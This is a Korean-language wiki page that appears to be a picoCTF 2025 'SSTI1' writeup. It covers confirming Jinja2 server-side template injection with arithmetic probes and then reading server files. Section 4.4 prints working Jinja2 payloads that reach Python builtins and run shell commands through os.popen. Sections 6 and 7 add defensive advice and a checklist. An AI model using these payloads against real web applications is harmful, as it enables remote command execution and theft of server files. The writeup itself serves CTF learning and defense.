---
title: SSTI1 — picoCTF 2025 web writeup
created: 2026-06-14
updated: 2026-06-14
type: query
tags: [ctf, web, writeup, ssti, template-injection, template, rce]
sources: [https://medium.com/@ahmednarmer1/ctf-day-12-df893a7035fe, https://www.deniswambold.com/writeups/ssti1/, https://blog.qz.sg/picoctf-2025-web-exploitation-writeups/, https://medium.com/@pragusga/picoctf-write-up-ssti1-server-side-template-injection-38702986091d, https://jinja.palletsprojects.com/, https://portswigger.net/web-security/server-side-template-injection, https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection]
confidence: high
---

# SSTI1 — picoCTF 2025 web writeup

> 사용자가 입력한 공지 문구가 서버 측 템플릿 엔진에서 평가되는지 확인하고, [[jinja2-template-engine|Jinja2]] 문법을 통해 [[ssti|SSTI]]를 증명한 뒤 서버 파일을 읽는 picoCTF 2025 Web Exploitation 문제입니다.

## 1. 한 줄 요약

`SSTI1`은 입력값이 단순 문자열로 출력되는 것이 아니라 서버의 [[jinja2-template-engine|Jinja2 Template Engine]]에서 평가되는 문제입니다. 공개 writeup들은 `{{7*7}}` 또는 `{{5*5}}`가 `49`/`25`로 평가되는 것을 근거로 [[ssti-core|SSTI]]를 확인하고, Python/Jinja 내부 객체를 통해 파일 내용을 읽는 흐름으로 풀이합니다.

## 2. 문제 메타데이터

| 항목 | 내용 |
|------|------|
| 플랫폼 | picoCTF 2025 |
| 카테고리 | Web Exploitation |
| 문제명 | SSTI1 |
| 핵심 취약점 | [[ssti|Server-Side Template Injection]] |
| 관련 엔진 | [[jinja2-template-engine|Jinja2]] |
| 난이도 | Easy / 100 points로 공개 writeup들에서 언급 |
| 재사용 패턴 | 입력 반사 → 템플릿 산술 평가 → 엔진 식별 → 내부 객체 접근 → flag 파일 읽기 |

## 3. 공격면

| 요소 | 관찰 |
|------|------|
| 입력 지점 | 공지 문구를 입력하는 단일 form field |
| 출력 지점 | 입력값이 서버 응답 페이지에 다시 표시됨 |
| 초기 오해 가능성 | HTML/JavaScript 입력이 반사되어 [[xss]]처럼 보일 수 있음 |
| 실제 핵심 | 템플릿 문법이 서버에서 평가되는 [[ssti]] |
| 방어 실패 | 사용자 입력을 템플릿 원문 또는 렌더링 가능한 코드 경로로 전달 |

## 4. 풀이 흐름

### 4.1 입력 반사 확인

Denis Wambold writeup은 페이지가 단순한 HTML form이며, 사용자가 입력한 announcement가 다시 표시된다고 설명합니다. 이 단계에서는 숨겨진 endpoint보다 **입력이 어떤 렌더링 경로를 타는지**가 중요합니다.

### 4.2 SSTI 여부 확인

공개 writeup들은 다음과 같은 무해한 산술식을 먼저 사용합니다.

```jinja2
{{7*7}}
```

예상 관찰:

```text
49
```

또는:

```jinja2
{{5*5}}
```

예상 관찰:

```text
25
```

이 결과는 입력값이 브라우저에서만 실행되는 것이 아니라, 서버의 템플릿 엔진에서 먼저 평가되었음을 보여줍니다.

### 4.3 Jinja2 계열로 식별

qz.sg writeup은 `{{ config }}` 출력으로 Flask/Jinja2 계열 가능성을 확인했다고 정리합니다. 다른 writeup들은 `self.__init__.__globals__`나 `request.application.__globals__` 같은 내부 객체 접근을 통해 Python/Jinja 런타임 컨텍스트가 노출되는지 확인합니다.

### 4.4 서버 파일 읽기

여러 공개 writeup은 Python builtin 접근 후 `os` 모듈을 사용해 디렉터리를 나열하고 flag 파일을 읽는 흐름을 설명합니다. 교육 문서에서는 아래 흐름을 **격리된 CTF 인스턴스에서만** 재현 대상으로 둡니다.

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
```

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
```

Ahmed Narmer writeup은 유사하게 `request.application.__globals__.__builtins__` 경로를 사용합니다. qz.sg writeup은 `namespace.__init__.__globals__.os.popen('grep picoCTF . -rnw').read()` 형태의 Jinja2 payload를 제시합니다.

## 5. 핵심 개념 분리

이 문제에서 재사용 가능한 개념은 다음과 같습니다.

- [[ssti]] — 사용자 입력이 서버 측 템플릿 문법으로 평가되는 취약점
- [[jinja2-template-engine]] — 이번 문제에서 핵심이 되는 Python 템플릿 엔진
- [[rce]] — SSTI가 심화되면 원격 명령 실행으로 이어질 수 있음
- [[xss]] — 초기에 혼동될 수 있지만 실행 위치가 브라우저가 아니라 서버라는 점이 다름

## 6. 방어 관점

1. 사용자 입력을 템플릿 문자열 원문에 붙이지 않습니다.
2. 사용자 입력은 템플릿 변수 값으로만 전달합니다.
3. Jinja2 사용 시 autoescape를 유지하고, 신뢰할 수 없는 템플릿에는 `SandboxedEnvironment`와 allowlist를 적용합니다.
4. blacklist로 `os`, `cat`, `ls` 같은 단어만 막는 방식은 우회 여지가 큽니다.
5. 서버 프로세스 권한을 최소화하고 flag/secret 파일이 웹 프로세스 권한으로 읽히지 않게 분리합니다.

## 7. 동일 계열 문제 체크리스트

- [ ] 입력값이 그대로 반사되는가?
- [ ] `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` 중 평가되는 문법이 있는가?
- [ ] 에러 메시지나 출력으로 엔진을 식별할 수 있는가?
- [ ] 설정값, 환경변수, 내부 객체가 노출되는가?
- [ ] 파일 읽기 또는 명령 실행으로 확대되는가?
- [ ] 방어 관점에서 템플릿 원문과 사용자 데이터를 분리했는가?

## 8. 출처별 교차 확인

| 출처 | 확인한 내용 |
|------|-------------|
| Ahmed Narmer Medium | `{{7*7}}` 확인, `request.application.__globals__` 기반 우회, flag 파일 읽기 |
| Denis Wambold | 단일 form 구조, `{{5*5}}` 확인, `self.__init__.__globals__` 기반 파일 읽기 |
| qz.sg | picoCTF 2025 Web Exploitation 묶음, `{{ config }}`, `namespace.__init__.__globals__.os.popen(...)` 패턴 |
| Taufik Pragusga Medium | XSS로 오해할 수 있는 초기 관찰, SSTI 재식별, Jinja2 내부 객체 접근 |
| PortSwigger / OWASP WSTG | SSTI 탐지·식별·익스플로잇 방법론과 방어 원칙 |

## 9. 관련 페이지

- [[web-ctf-writeup-parser-template]]
- [[web-ctf-writeup-curation]]
- [[ssti-ctf-patterns]]
- [[ssti-defense]]
